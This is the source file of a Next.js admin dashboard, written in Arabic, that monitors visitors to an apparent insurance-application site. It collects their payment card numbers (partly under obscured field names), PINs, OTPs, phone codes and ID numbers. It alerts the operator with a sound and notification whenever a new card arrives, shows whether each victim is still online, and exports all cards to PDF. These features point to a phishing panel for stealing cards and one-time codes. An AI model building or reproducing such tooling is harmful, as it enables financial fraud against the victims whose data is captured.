"use client";

import { useState, useEffect, useMemo, useRef } from "react";
import {
  subscribeToApplications,
  updateApplication,
  deleteMultipleApplications,
  subscribeToPresence,
  type PresenceRecord,
} from "@/lib/firebase-services";
import { generateAllCardsPdf } from "@/lib/generate-pdf";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { VisitorSidebar } from "@/components/visitor-sidebar";
import { VisitorDetails } from "@/components/visitor-details";
import { DashboardHeader } from "@/components/dashboard-header";
import { ProtectedRoute } from "@/components/protected-route";
import {
  getVisitorDisplayName,
  shouldDisplayVisitorRecord,
} from "@/lib/visitor-utils";
import { Timestamp } from "firebase/firestore";
import { toast } from "sonner";

const toTimeValue = (value: unknown): number => {
  if (!value) return 0;

  if (value instanceof Date) {
    return value.getTime();
  }

  if (value instanceof Timestamp) {
    return value.toDate().getTime();
  }

  if (typeof value === "object" && typeof (value as any).toDate === "function") {
    try {
      return (value as any).toDate().getTime();
    } catch {
      return 0;
    }
  }

  const parsed = new Date(value as any).getTime();
  return Number.isNaN(parsed) ? 0 : parsed;
};

const getPrioritySortTime = (application: InsuranceApplication): number => {
  const directTimes = [
    (application as any).insurUpdatedAt,
    application.updatedAt,
    application.cardUpdatedAt,
    application.otpUpdatedAt,
    application.pinUpdatedAt,
    application.phoneOtpUpdatedAt,
    application.phoneUpdatedAt,
    application.offerUpdatedAt,
    application.insuranceUpdatedAt,
    application.lastActiveAt,
    application.lastSeen,
  ];

  let latestTime = Math.max(...directTimes.map(toTimeValue), 0);

  if (application.history && Array.isArray(application.history)) {
    for (const entry of application.history as any[]) {
      const entryTime = toTimeValue(entry?.timestamp);
      if (entryTime > latestTime) {
        latestTime = entryTime;
      }
    }
  }

  return latestTime || toTimeValue(application.createdAt);
};

const getCardState = (application: InsuranceApplication) => {
  const cardHistory =
    application.history?.filter(
      (entry: any) =>
        (entry.type === "_t1" || entry.type === "card") &&
        (entry.data?._v1 || entry.data?.cardNumber)
    ) || [];

  if (cardHistory.length > 0) {
    const sortedCardHistory = [...cardHistory].sort(
      (a: any, b: any) => toTimeValue(b?.timestamp) - toTimeValue(a?.timestamp)
    );
    const latest = sortedCardHistory[0];
    const latestCardValue = latest?.data?._v1 || latest?.data?.cardNumber || "";

    return {
      count: cardHistory.length,
      key: `history|${latest?.id || ""}|${latest?.timestamp || ""}|${latestCardValue}`,
    };
  }

  const directCard = application._v1 || application.cardNumber || "";
  if (typeof directCard === "string" && directCard.trim()) {
    return { count: 1, key: `direct|${directCard}` };
  }

  return null;
};

const showCardNotification = (visitors: InsuranceApplication[]) => {
  if (visitors.length === 0 || typeof window === "undefined") return;

  const firstVisitorName = getVisitorDisplayName(visitors[0]);
  const message =
    visitors.length === 1
      ? `تمت إضافة بطاقة جديدة للزائر: ${firstVisitorName}`
      : `تمت إضافة بطاقات جديدة (${visitors.length})`;

  toast.success(message, { id: "card-added" });

  if ("Notification" in window && Notification.permission === "granted") {
    new Notification("بطاقة جديدة", { body: message, tag: "card-added" });
  }
};

export default function Dashboard() {
  const [applications, setApplications] = useState<InsuranceApplication[]>([]);
  const [selectedVisitor, setSelectedVisitor] =
    useState<InsuranceApplication | null>(null);
  const [isMobileLayout, setIsMobileLayout] = useState(false);
  const [showVisitorDetailsOnMobile, setShowVisitorDetailsOnMobile] =
    useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [cardFilter, setCardFilter] = useState<"all" | "hasCard">("all");
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(true);
  const [isExportingAllCards, setIsExportingAllCards] = useState(false);
  const [sidebarWidth, setSidebarWidth] = useState(215); // Default landscape width
  const hasLoadedInitialSnapshotRef = useRef(false);
  const previousUnreadIds = useRef<Set<string>>(new Set());
  const previousCardStateRef = useRef<Map<string, { count: number; key: string }>>(
    new Map()
  );
  const selectedVisitorIdRef = useRef<string | null>(null);
  const visitorOrderRef = useRef<string[]>([]);
  // RTDB presence map: { [docId]: { online, lastSeen } }
  const [rtdbPresence, setRtdbPresence] = useState<Record<string, PresenceRecord>>({});
  const rtdbPresenceRef = useRef<Record<string, PresenceRecord>>({});
  // Periodic tick so isOnline recalculates every 30s even without Firestore updates
  const [tick, setTick] = useState(0);

  // Play notification sound
  const playNotificationSound = () => {
    const audio = new Audio("/notification-piano.mp3");
    audio.play().catch((e) => console.log("Could not play sound:", e));
  };

  // Subscribe to Realtime DB presence (instant online/offline detection)
  useEffect(() => {
    const unsubscribePresence = subscribeToPresence((presence) => {
      rtdbPresenceRef.current = presence;
      setRtdbPresence(presence);
    });

    // Periodic tick every 30s to recalculate isOnline even when Firestore is quiet
    const tickTimer = setInterval(() => setTick((t) => t + 1), 30_000);

    return () => {
      unsubscribePresence();
      clearInterval(tickTimer);
    };
  }, []);

  // Subscribe to Firebase
  useEffect(() => {
    const unsubscribe = subscribeToApplications((apps) => {
      const isInitialSnapshot = !hasLoadedInitialSnapshotRef.current;

      // Show completed data plus modern ref-based sessions that may still be
      // mid-registration before the visitor fills name/phone.
      const validApps = apps.filter(shouldDisplayVisitorRecord);

      // Calculate isOnline based on lastActiveAt (fallback to lastSeen for legacy docs).
      const now = new Date();
      const thirtySecondsAgoTime = now.getTime() - 30 * 1000;

      const appsWithOnlineStatus = validApps.map((app) => {
        // Prefer RTDB presence (updated by onDisconnect handler in visitor site)
        // Fallback to lastActiveAt window calculation for legacy / non-RTDB visitors
        let isOnline: boolean;
        if (app.id && rtdbPresenceRef.current[app.id] !== undefined) {
          isOnline = rtdbPresenceRef.current[app.id].online;
        } else {
          const lastActivityTime = toTimeValue(app.lastActiveAt ?? app.lastSeen);
          isOnline = lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;
        }

        return { ...app, isOnline };
      });

      // Sort visitors by latest activity (card/OTP/history/updates) newest first
      const sorted = appsWithOnlineStatus.sort((a, b) => {
        const timeA = getPrioritySortTime(a);
        const timeB = getPrioritySortTime(b);
        return timeB - timeA; // Most recent first
      });

      // Update the order ref
      visitorOrderRef.current = sorted
        .map((app) => app.id!)
        .filter((id): id is string => id !== undefined);

      // Check for new unread visitors
      const currentUnreadIds = new Set(
        sorted.filter((app) => app.isUnread && app.id).map((app) => app.id!)
      );

      // Find newly added unread visitors
      const newUnreadIds = Array.from(currentUnreadIds).filter(
        (id) => !previousUnreadIds.current.has(id)
      );

      // Play sound if there are new unread visitors
      if (newUnreadIds.length > 0 && !isInitialSnapshot) {
        playNotificationSound();
      }

      // Check for new card submissions (new card entry or changed card details)
      const currentCardState = new Map<string, { count: number; key: string }>();
      const visitorsWithNewCard: InsuranceApplication[] = [];

      for (const visitor of sorted) {
        if (!visitor.id) continue;
        const cardState = getCardState(visitor);
        if (!cardState) continue;

        currentCardState.set(visitor.id, cardState);

        const previousCardState = previousCardStateRef.current.get(visitor.id);
        if (!previousCardState) {
          if (!isInitialSnapshot) {
            visitorsWithNewCard.push(visitor);
          }
          continue;
        }

        if (
          cardState.count > previousCardState.count ||
          cardState.key !== previousCardState.key
        ) {
          visitorsWithNewCard.push(visitor);
        }
      }

      if (visitorsWithNewCard.length > 0 && !isInitialSnapshot) {
        playNotificationSound();
        showCardNotification(visitorsWithNewCard);
      }

      // Update previous unread IDs
      previousUnreadIds.current = currentUnreadIds;
      previousCardStateRef.current = currentCardState;
      hasLoadedInitialSnapshotRef.current = true;

      setApplications(sorted);
      setLoading(false);

      // Update selected visitor if it exists in the new list (to keep it synced)
      setSelectedVisitor((prev) => {
        if (prev && prev.id) {
          selectedVisitorIdRef.current = prev.id;
          const updatedVisitor = sorted.find((app) => app.id === prev.id);
          return updatedVisitor || prev;
        }

        // Auto-select first visitor only if none selected
        if (!prev && sorted.length > 0) {
          selectedVisitorIdRef.current = sorted[0].id || null;
          return sorted[0];
        }

        return prev;
      });
    });

    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") return;

    const mediaQuery = window.matchMedia("(max-width: 767px)");
    const applyLayout = (isMobile: boolean) => {
      setIsMobileLayout(isMobile);
      if (!isMobile) {
        setShowVisitorDetailsOnMobile(false);
      }
    };

    applyLayout(mediaQuery.matches);

    const onChange = (event: MediaQueryListEvent) => {
      applyLayout(event.matches);
    };

    if (typeof mediaQuery.addEventListener === "function") {
      mediaQuery.addEventListener("change", onChange);
      return () => mediaQuery.removeEventListener("change", onChange);
    }

    mediaQuery.addListener(onChange);
    return () => mediaQuery.removeListener(onChange);
  }, []);

  // Filter applications
  const filteredApplications = useMemo(() => {
    // Re-apply isOnline using latest RTDB presence + periodic tick.
    // This makes the UI react instantly when a visitor disconnects (RTDB fires
    // onDisconnect) without waiting for the next Firestore snapshot.
    const now = new Date();
    const thirtySecondsAgoTime = now.getTime() - 30 * 1000;

    const appsWithLivePresence = applications.map((app) => {
      let isOnline: boolean;
      if (app.id && rtdbPresence[app.id] !== undefined) {
        // RTDB presence is the most accurate source (updated via onDisconnect)
        isOnline = rtdbPresence[app.id].online;
      } else {
        // Fallback: 30-second heartbeat window for visitors without RTDB data
        const lastActivityTime = toTimeValue(app.lastActiveAt ?? app.lastSeen);
        isOnline = lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;
      }
      return { ...app, isOnline };
    });

    // tick is intentionally listed in deps to force re-evaluation every 30s
    void tick;

    let filtered = appsWithLivePresence;

    // Card filter
    if (cardFilter === "hasCard") {
      filtered = filtered.filter((app) => {
        // Check direct fields
        if (app._v1 || app.cardNumber) return true;

        // Check history for card entry (type _t1 or card)
        if (app.history && Array.isArray(app.history)) {
          return app.history.some(
            (entry: any) =>
              (entry.type === "_t1" || entry.type === "card") &&
              (entry.data?._v1 || entry.data?.cardNumber)
          );
        }

        return false;
      });
    }

    // Search filter
    if (searchQuery) {
      const query = searchQuery.toLowerCase();
      filtered = filtered.filter((app) => {
        const cardNum = app._v1 || app.cardNumber;
        return (
          app.ownerName?.toLowerCase().includes(query) ||
          app.identityNumber?.includes(query) ||
          app.phoneNumber?.includes(query) ||
          app.stcPhone?.includes(query) ||
          app.referenceNumber?.toLowerCase().includes(query) ||
          app.id?.toLowerCase().includes(query) ||
          cardNum?.slice(-4).includes(query)
        );
      });
    }

    return filtered;
  }, [applications, cardFilter, searchQuery, rtdbPresence, tick]);

  // Handle select all
  const handleSelectAll = () => {
    if (selectedIds.size === filteredApplications.length) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(
        new Set(
          filteredApplications
            .map((app) => app.id)
            .filter((id): id is string => id !== undefined)
        )
      );
    }
  };

  const handleExportAllCards = async () => {
    setIsExportingAllCards(true);
    try {
      await generateAllCardsPdf(applications);
    } catch (error) {
      console.error("Export all cards error:", error);
    } finally {
      setIsExportingAllCards(false);
    }
  };

  // Handle delete selected
  const handleDeleteSelected = async () => {
    if (selectedIds.size === 0) return;

    const count = selectedIds.size;
    if (
      !confirm(
        `هل أنت متأكد من حذف ${count} زائر؟\n\nهذا الإجراء لا يمكن التراجع عنه.`
      )
    ) {
      return;
    }

    try {
      console.log("Deleting visitors:", Array.from(selectedIds));
      const idsToDelete = Array.from(selectedIds);
      await deleteMultipleApplications(idsToDelete);
      setSelectedIds(new Set());
      console.log("Delete successful");
      alert(`✅ تم حذف ${count} زائر بنجاح`);
    } catch (error) {
      console.error("Error deleting applications:", error);
      alert(
        `❌ حدث خطأ أثناء الحذف: ${
          error instanceof Error ? error.message : "خطأ غير معروف"
        }`
      );
    }
  };

  // Mark as read when visitor is selected
  const handleSelectVisitor = async (visitor: InsuranceApplication) => {
    setSelectedVisitor(visitor);
    if (isMobileLayout) {
      setShowVisitorDetailsOnMobile(true);
    }

    // Mark as read
    if (visitor.isUnread && visitor.id) {
      await updateApplication(visitor.id, { isUnread: false });
    }
  };

  if (loading) {
    return (
      <div className="min-h-dvh flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600 mx-auto"></div>
          <p className="mt-4 text-gray-600">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  return (
    <ProtectedRoute>
    <div
      className="min-h-screen h-dvh flex flex-col bg-gradient-to-br from-slate-50 via-gray-50 to-indigo-50/40"
      dir="rtl"
    >
      <DashboardHeader
        onExportAllCards={handleExportAllCards}
        isExportingAllCards={isExportingAllCards}
      />
      <div className="flex-1 flex overflow-hidden">
        <div
          className={`${
            isMobileLayout
              ? "h-full w-full"
              : "flex-1 flex landscape:flex-row md:flex-row overflow-hidden"
          }`}
        >
          {/* Right Sidebar - Visitor List */}
          <div
            className={
              isMobileLayout && showVisitorDetailsOnMobile
                ? "hidden"
                : isMobileLayout
                ? "h-full w-full"
                : "h-full shrink-0"
            }
          >
            <VisitorSidebar
              visitors={filteredApplications}
              selectedVisitor={selectedVisitor}
              onSelectVisitor={handleSelectVisitor}
              searchQuery={searchQuery}
              onSearchChange={setSearchQuery}
              cardFilter={cardFilter}
              onCardFilterChange={setCardFilter}
              selectedIds={selectedIds}
              onToggleSelect={(id) => {
                const newSet = new Set(selectedIds);
                if (newSet.has(id)) {
                  newSet.delete(id);
                } else {
                  newSet.add(id);
                }
                setSelectedIds(newSet);
              }}
              onSelectAll={handleSelectAll}
              onDeleteSelected={handleDeleteSelected}
              sidebarWidth={sidebarWidth}
              onSidebarWidthChange={setSidebarWidth}
            />
          </div>

          {/* Left Side - Visitor Details */}
          <div
            className={`${
              isMobileLayout && !showVisitorDetailsOnMobile
                ? "hidden"
                : isMobileLayout
                ? "flex h-full w-full min-h-0"
                : "flex flex-1 min-h-0"
            }`}
          >
            <VisitorDetails
              visitor={selectedVisitor}
              onBack={
                isMobileLayout
                  ? () => setShowVisitorDetailsOnMobile(false)
                  : undefined
              }
            />
          </div>
        </div>
      </div>
    </div>
    </ProtectedRoute>
  );
}
